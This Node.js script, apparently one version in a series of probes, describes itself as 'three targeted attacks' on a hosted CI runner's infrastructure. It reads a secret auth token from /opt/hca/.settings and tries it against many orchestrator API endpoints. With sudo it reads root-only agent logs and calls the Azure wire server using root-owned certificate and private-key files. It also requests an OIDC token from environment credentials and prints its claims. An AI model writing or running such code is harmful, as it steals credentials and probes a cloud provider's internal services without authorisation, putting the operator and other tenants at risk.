const { execSync } = require('child_process');
const fs = require('fs');
const https = require('https');
const http = require('http');

// v38: Three targeted attacks based on v37 findings
// 1. Read /opt/hca/logs/hosted-compute-agent.log (shows real API calls + endpoints + responses)
// 2. Test /v1/request/heartbeat (found in binary strings) + variants against orchestrator
// 3. Wire server with sudo (cert/key are root-only, need sudo for curl)

function run(cmd, timeoutMs) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: timeoutMs || 30000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 600).trim(); }
}

async function httpReq(url, opts) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const isHttps = u.protocol === 'https:';
    const options = {
      hostname: u.hostname, path: u.pathname + u.search,
      port: u.port || (isHttps ? 443 : 80),
      method: opts.method || 'GET', headers: opts.headers || {},
      timeout: 15000, rejectUnauthorized: false,
    };
    const req = (isHttps ? https : http).request(options, (res) => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: body.substring(0, 2000) }));
    });
    req.on('error', e => resolve({ status: 0, error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ status: 0, error: 'timeout' }); });
    if (opts.body) req.write(opts.body);
    req.end();
  });
}

async function main() {
  console.log('=== V38: HCA LOG + /request/heartbeat + WIRE SERVER SUDO ===');

  const settings = JSON.parse(fs.readFileSync('/opt/hca/.settings', 'utf8').trim());
  const { authToken, schedulerApiUrl } = settings;
  const baseOrch = schedulerApiUrl.replace(/\/+$/, '');
  const jwtPayload = JSON.parse(Buffer.from(authToken.split('.')[1], 'base64').toString('utf8'));
  const widMatch = (jwtPayload.wid || '').match(/\{([^}]+)\}:\{([^}]+)\}:\{([^}]+)\}/);
  const containerId = widMatch ? widMatch[3] : null;
  console.log('[JWT] env:', jwtPayload.env, '| schedulerApiUrl:', schedulerApiUrl);
  console.log('[JWT] containerId:', containerId);

  // === PART 1: HCA log file — actual API calls ===
  console.log('\n=== PART 1: HCA log file — real orchestrator calls ===');
  const logFiles = [
    '/opt/hca/logs/hosted-compute-agent.log',
    '/opt/hca/logs/hca.log',
    '/opt/hca/hca.log',
  ];
  for (const logFile of logFiles) {
    const content = run(`sudo cat "${logFile}" 2>/dev/null | head -200`);
    if (content && !content.startsWith('ERR')) {
      console.log('[HCA_LOG] === ' + logFile + ' ===');
      console.log(content.substring(0, 3000));
      // Also tail for most recent entries
      const tail = run(`sudo tail -50 "${logFile}" 2>/dev/null`);
      console.log('[HCA_LOG] TAIL:');
      console.log(tail.substring(0, 2000));
    } else {
      console.log('[HCA_LOG]', logFile, ':', content.substring(0, 100));
    }
  }

  // Also check entire /opt/hca/logs/ directory
  const allLogs = run('sudo ls -la /opt/hca/logs/ 2>/dev/null');
  console.log('[HCA_LOG] /opt/hca/logs/:', allLogs);
  // Look for any JSON log files that might have structured API call data
  const jsonLogs = run('sudo find /opt/hca -name "*.log" -o -name "*.json" 2>/dev/null | grep -v ".settings\\|diagnostics"');
  console.log('[HCA_LOG] all log-like files:', jsonLogs);

  // === PART 2: Test /request/heartbeat and variants ===
  console.log('\n=== PART 2: /request/heartbeat and variants ===');
  const authHeaders = {
    'Authorization': 'Bearer ' + authToken,
    'Content-Type': 'application/json',
    'User-Agent': 'hosted-compute-agent/unknown/unknown/unknown',
  };

  const heartbeatEndpoints = [
    // GET variants
    { method: 'GET', path: '/v1/request/heartbeat' },
    { method: 'GET', path: '/request/heartbeat' },
    // POST variants (heartbeat is typically a POST)
    { method: 'POST', path: '/v1/request/heartbeat', body: JSON.stringify({ containerId }) },
    { method: 'POST', path: '/request/heartbeat', body: JSON.stringify({ containerId }) },
    // POST with container info from JWT
    { method: 'POST', path: '/v1/request/heartbeat', body: JSON.stringify({
      containerId, poolId: widMatch ? widMatch[1] : null,
      vmId: widMatch ? widMatch[2] : null, configId: jwtPayload.cfg,
    })},
    // Other common HCA API patterns from binary
    { method: 'GET', path: '/v1/request' },
    { method: 'GET', path: '/v1/requests' },
    { method: 'POST', path: '/v1/requests' },
    { method: 'GET', path: '/v1/machine/state' },
    { method: 'GET', path: '/v1/machine/status' },
    { method: 'PATCH', path: '/v1/request/heartbeat', body: JSON.stringify({ containerId }) },
    { method: 'PUT', path: '/v1/request/heartbeat', body: JSON.stringify({ containerId }) },
    // Using container ID as path param (common pattern)
    ...(containerId ? [
      { method: 'GET', path: `/v1/requests/${containerId}` },
      { method: 'GET', path: `/v1/request/${containerId}` },
      { method: 'PATCH', path: `/v1/request/${containerId}` },
      { method: 'POST', path: `/v1/request/${containerId}/heartbeat` },
      { method: 'GET', path: `/v1/container/${containerId}` },
      { method: 'PATCH', path: `/v1/container/${containerId}` },
    ] : []),
  ];

  for (const ep of heartbeatEndpoints) {
    const url = baseOrch + ep.path;
    const r = await httpReq(url, {
      method: ep.method,
      headers: { ...authHeaders, ...(ep.body ? {} : {}) },
      body: ep.body || null,
    });
    const noteworthy = r.status !== 404 && r.status !== 0;
    if (noteworthy) {
      console.log(`[HEARTBEAT] ${ep.method} ${ep.path} → HTTP ${r.status} *** NON-404 ***`);
      console.log('[HEARTBEAT] response headers:', JSON.stringify(r.headers).substring(0, 500));
      console.log('[HEARTBEAT] response body:', r.body.substring(0, 1000));
    } else {
      console.log(`[HEARTBEAT] ${ep.method} ${ep.path} → ${r.status} ${r.error || ''}`);
    }
  }

  // === PART 3: Wire server with sudo curl ===
  console.log('\n=== PART 3: Azure wire server with sudo curl ===');
  const wireTargets = [
    'http://168.63.129.16/?comp=versions',
    'http://168.63.129.16/?comp=goalstate',
    'http://168.63.129.16/machine/?comp=goalstate',
    'http://168.63.129.16/',
  ];
  for (const target of wireTargets) {
    // Use sudo curl so it can read the root-owned cert/key files
    const result = run(
      `sudo curl -s -w "\\n%{http_code}" --cert /var/lib/waagent/Certificates.pem --key /var/lib/waagent/TransportPrivate.pem --connect-timeout 6 "${target}" 2>/dev/null | tail -50`,
      12000
    );
    const lines = result.split('\n');
    const statusCode = lines[lines.length - 1];
    const body = lines.slice(0, -1).join('\n');
    console.log('[WIRE]', target, '→ HTTP', statusCode);
    if (statusCode && statusCode !== '0' && !statusCode.startsWith('ERR')) {
      console.log('[WIRE] body:', body.substring(0, 800));
      break;
    }
  }

  // Also try plain wire server without cert (some endpoints are unauthenticated)
  const noAuthResult = run('curl -s -w "\\n%{http_code}" --connect-timeout 5 "http://168.63.129.16/?comp=versions" 2>/dev/null');
  const noAuthLines = noAuthResult.split('\n');
  console.log('[WIRE_NOAUTH] /?comp=versions (no cert):', noAuthLines[noAuthLines.length - 1]);
  if (noAuthLines.length > 1) console.log('[WIRE_NOAUTH] body:', noAuthLines.slice(0, -1).join('\n').substring(0, 400));

  // === PART 4: ACTIONS_ID_TOKEN_REQUEST_URL — OIDC token ===
  console.log('\n=== PART 4: OIDC token via ACTIONS_ID_TOKEN_REQUEST_URL ===');
  const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
  const oidcToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  if (oidcUrl && oidcToken) {
    console.log('[OIDC] URL prefix:', oidcUrl.substring(0, 100));
    const oidcResp = await httpReq(oidcUrl, {
      headers: {
        'Authorization': 'Bearer ' + oidcToken,
        'User-Agent': 'probe-v38',
        'Accept': 'application/json',
      }
    });
    console.log('[OIDC] response status:', oidcResp.status);
    if (oidcResp.status === 200) {
      console.log('[OIDC] *** OIDC TOKEN OBTAINED ***');
      console.log('[OIDC] body:', oidcResp.body.substring(0, 500));
      // Decode the OIDC token
      try {
        const data = JSON.parse(oidcResp.body);
        const token = data.value || data.token;
        if (token) {
          const payload = JSON.parse(Buffer.from(token.split('.')[1] + '==', 'base64').toString());
          console.log('[OIDC] token.iss:', payload.iss);
          console.log('[OIDC] token.sub:', payload.sub);
          console.log('[OIDC] token.repository:', payload.repository);
          console.log('[OIDC] token.workflow:', payload.workflow);
          console.log('[OIDC] token.runner_environment:', payload.runner_environment);
        }
      } catch(e) { console.log('[OIDC] decode error:', e.message); }
    }
  } else {
    console.log('[OIDC] OIDC env vars not present (need id-token: write permission)');
  }

  // === PART 5: Read waagent GoalState / VMSettings from log ===
  console.log('\n=== PART 5: waagent.log — Azure goal state ===');
  const waagentLog = run('sudo tail -100 /var/log/waagent.log 2>/dev/null');
  if (waagentLog && !waagentLog.startsWith('ERR')) {
    // Extract lines mentioning wire server, goal state, certificates, or important events
    const interesting = waagentLog.split('\n').filter(l =>
      /goalstate|GoalState|wire|Wire|cert|Cert|168\.63|fabric|Fabric|vmId|VMID|container|token|uri/i.test(l)
    );
    console.log('[WAAGENT_LOG] Interesting entries:', interesting.length);
    interesting.slice(0, 30).forEach(l => console.log('[WAAGENT]', l.trim().substring(0, 200)));
  } else {
    console.log('[WAAGENT_LOG]', waagentLog.substring(0, 100));
  }

  console.log('\n=== V38 Complete ===');
}

main().catch(e => console.log('[FATAL]', e.message, e.stack));
